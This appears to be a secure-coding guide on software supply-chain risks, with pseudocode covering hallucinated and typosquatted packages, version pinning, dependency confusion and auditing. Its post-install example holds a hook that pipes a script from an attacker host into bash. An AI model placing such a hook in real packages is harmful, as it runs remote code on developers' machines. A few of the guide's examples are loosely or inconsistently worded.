# Pattern 7: Dependency Risks and Supply Chain Security

## INSTRUCTIONS FOR AI/LLM

This document provides IN-DEPTH coverage of the most critical security anti-patterns.
Each section includes multiple examples, edge cases, and detailed explanations.
All code is PSEUDOCODE - implement using secure patterns in your target language.
Pay special attention to the "Common Mistakes" and "Edge Cases" subsections.
These patterns cause the majority of security vulnerabilities in AI-generated code.

**When generating code, you MUST:**
1. Never use string concatenation for SQL queries, shell commands, or HTML output
2. Never embed secrets, API keys, or credentials in source code
3. Always validate and sanitize all user input on the server side
4. Use parameterized queries, established authentication libraries, and context-aware encoding
5. Verify that any suggested packages actually exist before recommending them

---


---

**CWE References:** CWE-1357 (Outdated or Unmaintained Dependencies), CWE-1403 (Improper Verification of Cryptographic Signature), CWE-502 (Deserialization of Untrusted Data), CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)

**Priority Score:** 24 (Frequency: 8, Severity: 9, Detectability: 7)

---

## Introduction: Why AI Especially Struggles with This

Dependency security represents one of the most dangerous and rapidly evolving attack surfaces in AI-generated code. The fundamental problem stems from AI models' training data and their tendency to hallucinate package names:

**Why AI Models Generate Dangerous Dependency Code:**

1. **Package Hallucination:** AI models generate plausible-sounding package names that don't exist. Studies show 5.2-21.7% package hallucination rates across models (USENIX Security Study). When developers then try to install these packages, attackers can register them with malicious code.

2. **Training Data Includes Vulnerable Code:** The vast majority of open-source code on GitHub uses outdated or vulnerable dependencies. AI learns these patterns as "normal" without understanding the security implications.

3. **No Contextual Awareness of Security Advisories:** AI models don't have real-time access to CVE databases, security advisories, or package reputation metrics. They suggest packages based on training data cutoff dates, missing recent vulnerabilities.

4. **Copy-Paste Culture in Tutorials:** Documentation and tutorials often show `npm install package-name` without version pinning or security checks. AI replicates this insecure pattern.

5. **Helpfulness Over Security:** When asked for functionality, AI suggests packages that provide it without verifying package legitimacy, age, or security track record.

6. **Typosquatting Blindness:** AI doesn't recognize that "react-utils" might be a malicious typo of "react-utils-helper" or that "colours" could be typosquatting the legitimate "colors" package.

**Impact Statistics:**

- **1.2B+** malicious package downloads detected in 2023 (Sonatype State of the Software Supply Chain)
- **650%** increase in supply chain attacks from 2020 to 2023 (Astrix Security Report)
- Package hallucination allows attackers to compromise projects before they're even written
- Average time to detect malicious dependency: **212 days**
- Supply chain attacks increased by **300%** in 2023 (ReversingLabs)

**Real-World Examples:**

- **event-stream incident:** Attacker added malicious code to popular package, stealing bitcoin from developer wallets
- **ua-parser-js hijack:** Compromised dependency infected thousands of projects with cryptocurrency miners
- **colors.js/faker.js sabotage:** Maintainer deliberately broke packages, affecting millions of projects

---

## BAD Examples: Different Manifestations

### BAD Example 1: AI-Hallucinated Package Installation

```pseudocode
// VULNERABLE: AI suggests non-existent package
// Developer prompt: "How do I parse JSON safely in Node.js?"

// AI response suggests:
IMPORT ai_json_parser from "ai-json-parser"

function parseSecurely(jsonString):
    // Attacker registered this package after AI hallucinated it
    return ai_json_parser.parse(jsonString)
end function

// The package "ai-json-parser" never existed until
// an attacker saw AI suggesting it and registered it
// with malicious code that exfiltrates data
```

### BAD Example 2: Typosquatting Through AI Suggestions

```pseudocode
// VULNERABLE: AI suggests slightly misspelled packages
// User asks: "How do I use colors in terminal output?"

// AI responds with common typosquatting targets:
IMPORT colours from "colours"        // Typosquat of "colors"
IMPORT lodashs from "lodashs"        // Typosquat of "lodash"
IMPORT requets from "requets"        // Typosquat of "requests"
IMPORT cripto from "cripto"          // Typosquat of "crypto"

function formatOutput(text):
    // All these packages are malicious variants
    // stealing environment variables, API keys, etc.
    return colours.red(text)
end function
```

### BAD Example 3: No Version Pinning

```pseudocode
// VULNERABLE: Accepting AI's loose version constraints

// package.json generated by AI:
{
    dependencies: {
        "express": "*",              // ANY version - extremely dangerous
        "lodash": "latest",          // Always latest - no reproducibility
        "react": "^18.0.0",          // Allows minor/patch updates automatically
        "axios": "",                 // No version specified
        "moment": ">=2.0.0"          // Minimum only - accepts any newer
    }
}

// Problem: Build today gets different versions than build tomorrow
// If a malicious actor publishes a new version, you automatically get it
```

### BAD Example 4: Installing Outdated Vulnerable Packages

```pseudocode
// VULNERABLE: AI suggests known vulnerable versions

// AI trained on older code suggests:
dependencies = {
    "lodash": "4.17.0",          // CVE-2019-10744 prototype pollution
    "express": "3.21.2",          // EOL with multiple critical CVEs
    "serialize-javascript": "1.9.0",  // Remote code execution
    "minimist": "0.0.8",          // Prototype pollution
    "axios": "0.18.1"             // Multiple path traversal CVEs
}

function installDependencies():
    // No security audit
    packageManager.install()

    // Application now running with known vulnerabilities
    startServer()
end function
```

### BAD Example 5: Missing Integrity Checks

```pseudocode
// VULNERABLE: No verification of package authenticity

// package.json without integrity
{
    dependencies: {
        "critical-lib": "2.1.4"
    }
}

// npm install happens without verification
// Attacker performs MITM on registry or compromises repository
// Package replaced with malicious version
// No integrity check to detect modification

function installDependencies():
    // No --integrity flag
    // No checksum verification
    packageManager.install()

    // Malicious package now running
end function
```

### BAD Example 6: Transitive Dependency Blind Trust

```pseudocode
// VULNERABLE: Not checking what dependencies depend on

// Direct dependency looks safe
{
    dependencies: {
        "legitimate-package": "5.2.1"
    }
}

// But legitimate-package's dependencies include:
// - malicious-package-exfiltrate-data
// - outdated-crypto-lib
// - typosquat-attempt

function auditTransitive():
    // Only checking direct dependencies
    direct = getDirectDependencies()
    audit(direct)

    // Missing: Transitive dependency audit
    transitive = getAllDependencies()  // Not called
    audit(transitive)  // Never happens
end function
```

### BAD Example 7: Unnecessary Dependencies

```pseudocode
// VULNERABLE: AI suggests massive dependency for simple function

// AI suggests: "Use Lodash for array operations"
IMPORT lodash from "lodash"

// Just to check if array is empty
function isEmpty(arr):
    return lodash.isEmpty(arr)
end function

// Problem: Adding 72KB library for one function
// Increases attack surface unnecessarily
// Lodash has had multiple vulnerabilities
// Could use native: arr.length === 0

// Another example:
IMPORT moment from "moment"  // 70KB date library

function getCurrentTimestamp():
    return moment().unix()
end function

// Could use native: Date.now() / 1000
```

---

## GOOD Examples: Proper Patterns

### GOOD Example 1: Package Verification Before Installation

```pseudocode
// SECURE: Comprehensive package verification

function verifyAndInstall(packageName, version):
    // Step 1: Registry verification
    packageInfo = registry.lookup(packageName)

    if packageInfo is null:
        throw SecurityError("Package does not exist in registry")

    // Step 2: Age and reputation checks
    if packageInfo.createdDate > (now() - 30_DAYS):
        log.warn("Recently created package - requires manual review", {
            package: packageName,
            created: packageInfo.createdDate
        })
        requireManualReview()
    end if

    if packageInfo.weeklyDownloads < 1000:
        log.warn("Low download count - verify legitimacy", {
            package: packageName,
            downloads: packageInfo.weeklyDownloads
        })
    end if

    // Step 3: Publisher verification
    if not packageInfo.publisher.verified:
        log.warn("Unverified publisher", {
            publisher: packageInfo.publisher.name
        })
        requireAdditionalApproval()
    end if

    // Step 4: Typosquatting detection
    similarPackages = findSimilarNames(packageName)
    for similar in similarPackages:
        if similar.downloads > packageInfo.downloads * 100:
            log.error("Possible typosquat attempt", {
                requested: packageName,
                likelyIntended: similar.name
            })
            throw SecurityError("Possible typosquat of " + similar.name)
        end if
    end for

    // Step 5: Security database check
    if securityDatabase.isMalicious(packageName):
        throw SecurityError("Package flagged as malicious")
    end if

    // Step 6: Known vulnerability check
    vulns = vulnerabilityDatabase.check(packageName, version)
    if vulns.hasCritical or vulns.hasHigh:
        throw SecurityError("Package has known vulnerabilities: " +
                            vulns.list)
    end if

    // All checks passed - safe to install
    packageManager.install(packageName, version)
end function
```

### GOOD Example 2: Proper Version Pinning

```pseudocode
// SECURE: Exact version pinning for reproducibility

// package.json with exact versions
{
    dependencies: {
        "express": "4.18.2",          // Exact version - no surprises
        "lodash": "4.17.21",          // Pinned to specific patch
        "react": "18.2.0",            // Reproducible builds
        "axios": "1.6.2"
    },
    // Lock file (package-lock.json) maintains integrity
    // CI/CD fails if lock file doesn't match package.json
}

function installDependencies():
    // Install from lock file
    packageManager.install("--frozen-lockfile")

    // Verify integrity
    result = packageManager.verifyIntegrity()

    if not result.valid:
        throw SecurityError("Integrity check failed - possible tampering")
    end if
end function

// Automated security updates workflow
function updateDependency(packageName):
    // Create test branch
    branch = git.createBranch("security-update-" + packageName)

    // Update single package
    packageManager.update(packageName, "--save-exact")

    // Run full test suite
    testResults = runTests()

    if testResults.allPass:
        // Check for vulnerabilities again
        vulns = securityScan()

        if vulns.count == 0:
            git.mergeBranch(branch)
            log.info("Security update applied: " + packageName)
        else:
            git.deleteBranch(branch)
            log.warn("Update introduced vulnerabilities - reverting")
        end if
    else:
        git.deleteBranch(branch)
        log.error("Tests failed - security update not applied")
    end if
end function
```

### GOOD Example 3: Dependency Allowlist

```pseudocode
// SECURE: Only approved packages allowed

// approved-packages.txt maintained by security team
approvedList = [
    "express",
    "lodash",
    "react",
    "axios",
    "jsonwebtoken"
    // ... carefully curated list
]

function enforceAllowlist():
    currentDeps = getAllDependencies()

    for dep in currentDeps:
        if dep not in approvedList:
            log.error("Unapproved dependency detected", {
                package: dep.name,
                version: dep.version,
                source: dep.source
            })

            // Block deployment
            throw SecurityError("Package not in allowlist: " + dep.name)
        end if
    end for

    log.info("All dependencies approved")
end function

// CI/CD integration
function ciPipeline():
    // Install dependencies
    packageManager.install()

    // Enforce allowlist
    enforceAllowlist()

    // Run security scan
    scanResult = securityScanner.scan({
        failOn: ["critical", "high"],
        scanTransitive: true
    })

    if not scanResult.passed:
        throw PipelineError("Security scan failed")
    end if

    // Continue with build
    buildApplication()
end function
```

### GOOD Example 4: Comprehensive Dependency Auditing

```pseudocode
// SECURE: Multi-layered security scanning

function comprehensiveSecurityAudit():
    // Layer 1: Package manager native audit
    npmAudit = runCommand("npm audit --audit-level=moderate")

    // Layer 2: Dedicated vulnerability scanner
    snykScan = snyk.scan({
        test: true,
        severity: ["high", "critical"],
        scanTransitive: true
    })

    // Layer 3: Software Composition Analysis (SCA)
    scaResults = scaTool.analyze({
        checkLicenses: true,
        checkVulnerabilities: true,
        checkOutdated: true
    })

    // Layer 4: Static analysis of dependency code
    staticAnalysis = staticSecurityAnalyzer.scan({
        target: "node_modules/",
        rules: ["dependency-backdoor", "obfuscated-code"]
    })

    // Layer 5: Runtime behavior analysis (in staging)
    runtimeAnalysis = runtimeBehaviorMonitor.monitor({
        duration: 24_HOURS,
        checkFor: ["unusual-network-activity", "file-system-access"]
    })

    // Aggregate results
    allFindings = aggregate([
        npmAudit,
        snykScan,
        scaResults,
        staticAnalysis,
        runtimeAnalysis
    ])

    // Generate comprehensive report
    report = securityReport.generate(allFindings)

    if report.hasCriticalVulnerabilities:
        // Block deployment
        notifySecurityTeam(report)
        throw DeploymentError("Critical vulnerabilities detected")
    end if

    return report
end function

// Automated continuous monitoring
function monitorProductionDependencies():
    // Check for new CVEs daily
    scheduler.daily(function():
        currentDeps = getProductionDependencies()

        for dep in currentDeps:
            // Query CVE database
            cves = cveDatabase.query({
                package: dep.name,
                version: dep.version,
                since: lastCheck
            })

            if cves.count > 0:
                alert = {
                    package: dep.name,
                    version: dep.version,
                    vulnerabilities: cves,
                    severity: cves.highestSeverity,
                    affectedSystems: getAffectedSystems(dep.name)
                }

                if alert.severity == "critical":
                    sendPagerDuty(alert)
                    triggerRollbackProcedure(dep.name)
                else:
                    createJiraTicket(alert, priority="high")
                end if
            end if
        end for
    end function)
end function
```

### GOOD Example 5: Minimal Dependency Usage

```pseudocode
// SECURE: Use native features when possible

// BAD: Importing 72KB Lodash library
// IMPORT lodash from "lodash"

// GOOD: Use native JavaScript
function isEmpty(arr):
    return Array.isArray(arr) and arr.length === 0
end function

function uniq(arr):
    return [...new Set(arr)]
end function

function merge(obj1, obj2):
    return {...obj1, ...obj2}
end function

// Date operations
// BAD: IMPORT moment from "moment"  // 70KB
// GOOD: Use native Intl.DateTimeFormat
function formatDate(date, locale):
    return new Intl.DateTimeFormat(locale, {
        year: "numeric",
        month: "long",
        day: "numeric"
    }).format(date)
end function

// HTTP requests
// Instead of importing request library
async function makeRequest(url):
    response = await fetch(url)
    return response.json()
end function

// Before adding any dependency:
function shouldAddDependency(packageName):
    // Check if native feature exists
    if hasNativeAlternative(packageName):
        log.warn("Native alternative available", {
            package: packageName,
            alternative: getNativeAlternative(packageName)
        })
        requireJustification()
    end if

    // Check dependency size
    packageSize = getPackageSize(packageName)
    if packageSize > 100_KB:
        log.warn("Large dependency", {
            package: packageName,
            size: packageSize
        })
        requireJustification()
    end if

    // Check security history
    vulns = getVulnerabilityHistory(packageName)
    if vulns.count > 3:
        log.error("Package has poor security history", {
            package: packageName,
            vulnerabilityCount: vulns.count
        })
        blockAddition()
    end if
end function
```

---

## Edge Cases Section

### Edge Case 1: CI/CD Pipeline Supply Chain Compromise

```pseudocode
// SCENARIO: Attacker compromises CI/CD tool dependencies
// Not your application dependencies, but build system dependencies

// GitHub Actions workflow
// .github/workflows/build.yml
steps:
  - name: Build
    uses: "attacker-controlled-action@v3"  // Malicious action
    with:
      args: "build"

// Attack: Action exfiltrates secrets, injects code

// DEFENSE: Pin action commit SHAs
steps:
  - name: Build
    uses: "legitimate-action@abc123def456"  // Pinned to commit SHA
    with:
      args: "build"

// Or use action allowlist
function validateGitHubAction(action):
    if action not in APPROVED_ACTIONS:
        throw SecurityError("Unapproved GitHub Action: " + action)
    end if
end function
```

### Edge Case 2: Dependency Confusion Attacks

```pseudocode
// SCENARIO: Attacker publishes public package with same name
// as your private package, but higher version number

// Your internal package:
// @mycompany/utils v1.0.0 (private registry)

// Attacker publishes:
// @mycompany/utils v2.0.0 (public npm registry)

// npm install @mycompany/utils
// → Installs v2.0.0 from public registry (malicious!)

// DEFENSE: Scoped registry configuration
// .npmrc
@mycompany:registry=https://npm.mycompany.com
registry=https://registry.npmjs.org

// Or use explicit scopes
function installScopedPackage(packageName):
    if packageName.startsWith("@mycompany/"):
        // Must use private registry
        packageManager.install(packageName, {
            registry: "https://npm.mycompany.com"
        })
    else:
        // Can use public registry
        packageManager.install(packageName)
    end if
end function
```

### Edge Case 3: Post-Install Scripts

```pseudocode
// SCENARIO: Package runs malicious script during installation

// Malicious package.json:
{
    "name": "malicious-package",
    "version": "1.0.0",
    "scripts": {
        "postinstall": "curl http://attacker.com/exfil.sh | bash"
    }
}

// When you run npm install, postinstall automatically runs

// DEFENSE: Disable postinstall scripts
function installSafely(packageName):
    // Option 1: Ignore scripts
    packageManager.install(packageName, "--ignore-scripts")

    // Option 2: Use --ignore-scripts in CI/CD
    // .npmrc
    // ignore-scripts=true

    // Option 3: Review and allowlist scripts
    packageInfo = registry.lookup(packageName)

    if packageInfo.hasInstallScripts:
        log.warn("Package has install scripts", {
            package: packageName,
            scripts: packageInfo.scripts
        })

        // Manual review required
        reviewScriptContents(packageName)
    end if
end function
```

### Edge Case 4: Typosquat Detection in AI Output

```pseudocode
// SCENARIO: AI generates package installation commands

// User: "How do I make HTTP requests?"
// AI: "Use the requets library in Python"
// User runs: pip install requets

// But real package is "requests", "requets" is typosquat

// DEFENSE: AI-aware package validation
function validateAISuggestedPackage(packageName, language):
    // Step 1: Verify package exists
    if not registry.exists(packageName, language):
        log.error("AI suggested non-existent package", {
            package: packageName
        })
        return {valid: false, reason: "Package does not exist"}
    end if

    // Step 2: Check for typosquat indicators
    typosquatCandidates = generateTyposquatVariants(packageName)

    for candidate in typosquatCandidates:
        if registry.exists(candidate, language):
            popular = registry.getPopularity(candidate)

            if popular > 1000000:  // Million+ downloads
                log.warn("AI suggested possible typosquat", {
                    suggested: packageName,
                    likelyIntended: candidate,
                    popularityDifference: popular - registry.getPopularity(packageName)
                })

                return {valid: false, reason: "Possible typosquat of " + candidate}
            end if
        end if
    end for

    return {valid: true}
end function
```

### Edge Case 5: Transitive Dependency Explosion

```pseudocode
// SCENARIO: One package pulls in hundreds of transitive deps

// You install 1 package
packageManager.install("small-library")

// Which depends on 10 packages
// Each of those depend on 10 more
// Total: 1,000+ transitive dependencies

// DEFENSE: Dependency tree analysis
function analyzeDependencyTree():
    // Build full tree
    tree = packageManager.buildTree()

    // Analyze depth
    maxDepth = tree.getMaxDepth()
    if maxDepth > 5:
        log.warn("Excessive dependency depth", {
            maxDepth: maxDepth,
            path: tree.getDeepestPath()
        })
    end if

    // Count total packages
    totalCount = tree.countAll()
    log.info("Total dependency count", {
        direct: tree.getDirectCount(),
        transitive: tree.getTransitiveCount(),
        total: totalCount
    })

    if totalCount > 500:
        log.error("Dependency explosion detected")

        // Find packages causing most bloat
        bloatedPackages = tree.findBloatedPackages()

        for pkg in bloatedPackages:
            log.warn("Consider alternative", {
                package: pkg.name,
                transitiveCount: pkg.transitiveCount,
                alternatives: findAlternatives(pkg.name)
            })
        end for
    end if
end function
```

---

## Common Mistakes Section

### Mistake 1: Trusting AI Package Suggestions Blindly

```pseudocode
// DEVELOPER: "How do I validate emails?"
// AI: "Use the email-validator package"
// Developer: npm install email-validator

// MISTAKE: Not checking if package exists
// REALITY: AI hallucinated "email-validator-pro"

// CORRECT APPROACH:
function addSuggestedPackage(packageName):
    // Verify package exists in registry
    if not registry.lookup(packageName):
        log.error("AI suggested non-existent package", {
            package: packageName
        })
        throw Error("Package does not exist - verify with AI")
    end if

    // Verify with search
    searchResults = registry.search(packageName)
    if searchResults[0].name != packageName:
        log.warn("Close match found - possible typo", {
            suggested: packageName,
            found: searchResults[0].name
        })
    end if

    // Then install
    packageManager.install(packageName)
end function
```

### Mistake 2: Ignoring Dev Dependency Vulnerabilities

```pseudocode
// MISTAKE: Thinking dev dependencies can't affect production

// package.json
{
    "devDependencies": {
        "webpack": "4.46.0",      // Has critical RCE vulnerability
        "jest": "26.6.0",          // Multiple CVEs
        "babel": "7.12.0"          // Path traversal
    }
}

// "These are only for testing, not production"

// REALITY: Dev tools still run on developer machines
// Attackers can compromise build systems
// Supply chain attacks target dev dependencies

// CORRECT APPROACH:
function auditAllDependencies():
    // Don't ignore dev dependencies
    auditResult = securityScanner.scan({
        includeDev: true,  // IMPORTANT
        failOn: ["critical", "high"]
    })

    // Treat dev deps with same security standards
    if auditResult.vulnerabilities.length > 0:
        throw SecurityError("Fix vulnerabilities in dev dependencies")
    end if
end function
```

### Mistake 3: Using --force or --unsafe-perm

```pseudocode
// MISTAKE: Bypassing security checks

// Installation fails due to permission issue
// Developer: npm install --force
// Developer: npm install --unsafe-perm

// PROBLEMS:
// --force: Bypasses integrity checks
// --unsafe-perm: Allows scripts to run as root

// CORRECT APPROACH:
function installWithProperPermissions():
    // Don't use --force
    // Don't use --unsafe-perm

    // Fix underlying issue
    if installFails():
        error = getLastError()

        if error.type == "permission":
            log.error("Permission error - fix directory ownership")
            runCommand("sudo chown -R $(whoami) node_modules")

        else if error.type == "integrity":
            log.error("Integrity check failed - possible compromise")
            throw SecurityError("Cannot bypass integrity check")

        else:
            throw error
        end if
    end if
end function
```

### Mistake 4: Not Lock CI/CD Dependencies

```pseudocode
// MISTAKE: CI/CD installs latest dependencies

// .gitlab-ci.yml
build:
  script:
    - npm install  # Gets latest versions
    - npm run build

// PROBLEM: Build passes today, fails tomorrow
// Security vulnerabilities can slip in

// CORRECT APPROACH:
// .gitlab-ci.yml
build:
  script:
    - npm ci  # Install from package-lock.json
    - npm run build

// Or use Docker with cached layers
// Dockerfile
COPY package*.json ./
RUN npm ci --only=production

COPY . .
RUN npm run build
```

### Mistake 5: Assuming Popular Packages Are Safe

```pseudocode
// MISTAKE: "1M weekly downloads, must be secure"

function installPopularPackage(packageName):
    info = registry.getInfo(packageName)

    if info.weeklyDownloads > 1000000:
        // MISTAKE: Assuming popularity = security
        packageManager.install(packageName)
        return
    end if
end function

// REALITY:
// - event-stream: Millions of downloads, compromised for months
// - ua-parser-js: 7M weekly downloads, hijacked with malware
// - colors.js: Top downloaded, maintainer sabotaged it

// CORRECT APPROACH:
function installPackageProperly(packageName):
    info = registry.getInfo(packageName)

    // Popularity is just one signal
    if info.weeklyDownloads > 1000000:
        log.info("Popular package - verify extra carefully")

        // Check maintainer history
        if not info.maintainer.trusted:
            log.warn("Popular package but untrusted maintainer", {
                package: packageName,
                maintainer: info.maintainer.name
            })
        end if

        // Check for recent ownership transfer
        if info.recentlyTransferred:
            log.error("Recent ownership transfer - review required")
            requireManualReview()
        end if
    end if

    // Always scan regardless of popularity
    scanResult = securityScanner.scan(packageName)

    if not scanResult.passed:
        throw SecurityError("Security scan failed")
    end if
end function
```

---

## Detection Hints: How to Spot Dependency Issues in Code Review

### Detection Checklist

**Manifest Files (package.json, requirements.txt, etc.):**
- [ ] No version specified or loose ranges (`*`, `latest`, `^`)
- [ ] AI-suggested package names that seem "slightly off"
- [ ] Packages with very low download counts in production
- [ ] Recently created packages (less than 6 months old)
- [ ] Packages with unverified publishers
- [ ] Missing lock files (package-lock.json, Pipfile.lock)

**Installation Scripts:**
- [ ] `npm install` without `--frozen-lockfile` in CI/CD
- [ ] `pip install` without `requirements.txt` pinning
- [ ] Use of `--force`, `--unsafe-perm`, or similar flags
- [ ] No integrity verification in install scripts

**Build Configuration:**
- [ ] No dependency scanning in CI/CD pipeline
- [ ] Missing security audit steps
- [ ] Auto-merge enabled for dependency updates without tests
- [ ] No transitive dependency analysis

**Code Review Red Flags:**
- [ ] Import statements for packages that don't exist
- [ ] Comments like "AI suggested this package"
- [ ] Unnecessary large dependencies for simple functions
- [ ] Multiple similar packages (e.g., both `colors` and `colours`)

### Automated Detection Tools

```bash
# Detect unpinned dependencies
npm audit --audit-level=moderate
npm-check-updates

# Detect typosquatting
# Use tools like: npm audit, Snyk, Dependabot

# Detect malicious packages
# Use: Socket.dev, Phylum, Snyk, Chainguard

# Dependency tree analysis
npm ls
pipdeptree
mvn dependency:tree
```

---

## Security Checklist

### Pre-Installation

- [ ] Verify package exists in official registry
- [ ] Check package age (prefer >6 months old)
- [ ] Review weekly download count (>1000 for production)
- [ ] Verify publisher is established and trusted
- [ ] Check for known vulnerabilities in version
- [ ] Scan for typosquatting attempts
- [ ] Review package security history
- [ ] Check if native alternative exists

### Installation

- [ ] Use exact version pinning (no ranges)
- [ ] Enable integrity verification
- [ ] Review postinstall scripts
- [ ] Disable install scripts if not needed
- [ ] Use lock files (package-lock.json, etc.)
- [ ] Verify lock file integrity

### Post-Installation

- [ ] Run security audit (npm audit, Snyk, etc.)
- [ ] Check transitive dependencies
- [ ] Scan for malicious code patterns
- [ ] Review network activity during install
- [ ] Check file system changes
- [ ] Document dependency justification

### CI/CD Pipeline

- [ ] Enable automated vulnerability scanning
- [ ] Fail build on critical/high vulnerabilities
- [ ] Use `npm ci` or equivalent in CI
- [ ] Implement frozen lockfiles
- [ ] Scan all dependencies (including dev)
- [ ] Monitor for new CVEs continuously
- [ ] Require approval for dependency additions
- [ ] Maintain dependency allowlist

### Ongoing Maintenance

- [ ] Subscribe to security advisories
- [ ] Enable Dependabot or similar
- [ ] Review and update dependencies monthly
- [ ] Remove unused dependencies
- [ ] Monitor for unusual package behavior
- [ ] Track dependency ownership changes
- [ ] Maintain SBOM (Software Bill of Materials)

---

**Remember:** In the age of AI-generated code, dependency security is more critical than ever. AI models hallucinate package names, suggest vulnerable versions, and cannot verify package legitimacy. Always verify, always scan, always pin versions.
